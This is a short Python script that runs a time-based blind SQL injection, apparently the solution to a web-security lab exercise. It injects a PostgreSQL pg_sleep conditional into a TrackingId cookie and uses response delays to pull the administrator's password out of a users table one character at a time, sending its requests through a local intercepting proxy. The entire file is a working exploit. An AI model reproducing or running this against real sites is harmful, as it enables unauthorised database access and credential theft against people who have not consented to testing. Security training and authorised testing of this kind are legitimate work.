import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def sqli_password(url):
    password_extracted = ""
    for i in range(1,21):
        elements = list(range(48, 58)) + list(range(97, 124))
        for j in elements:
            sqli_payload = "' || (Select case when (username='administrator' AND ascii(substring(password,%s,1))='%s') then pg_sleep(10) else pg_sleep(-1) END from users)--" % (i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId': 'APQOLvSL2vDPkwI0' + sqli_payload_encoded, 'session': 'J6CF0I9WkXZ1wV23k9pT9zmL3aAyJ54R'}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if int(r.elapsed.total_seconds()) > 9:
              password_extracted += chr(j)
              sys.stdout.write('\r' + password_extracted)
              sys.stdout.flush()
              break
            else:
              sys.stdout.write('\r' + password_extracted + chr(j))
              sys.stdout.flush()

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Retrieving administrator password...")
    sqli_password(url)

if __name__ == "__main__":
    main()
